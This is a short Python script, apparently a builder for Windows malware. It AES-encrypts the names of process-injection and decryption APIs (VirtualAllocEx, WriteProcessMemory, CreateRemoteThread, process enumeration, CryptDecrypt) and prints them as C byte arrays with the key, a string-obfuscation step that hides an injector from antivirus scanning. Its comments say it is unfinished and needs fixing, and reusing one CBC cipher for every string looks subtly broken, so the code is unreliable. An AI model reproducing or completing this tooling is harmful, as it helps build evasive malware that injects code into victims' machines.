import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

# Need to fix
# Issue with string to bytes I think
# Also add main functions

stringNames = ["KERNEL32.DLL", "GetModuleHandleW", "GetProcAddress", "CloseHandle", "LoadLibraryA",
			   "ADVAPI32.DLL", "CryptAcquireContextW", "CryptCreateHash", "CryptHashData", "CryptDeriveKey",
			   "CryptDecrypt", "CryptReleaseContext", "CryptDestroyHash", "CryptDestroyKey", "GetModuleHandleW",
			   "CreateToolhelp32Snapshot", "Process32First", "Process32Next", "lstrcmpiA", "VirtualAllocEx",
			   "WriteProcessMemory", "CreateRemoteThread", "WaitForSingleObject"]

for i in range(len(stringNames)):
	plaintext = stringNames[i].encode()
	ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
	print(f'unsigned char s{stringNames[i]}' + '[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
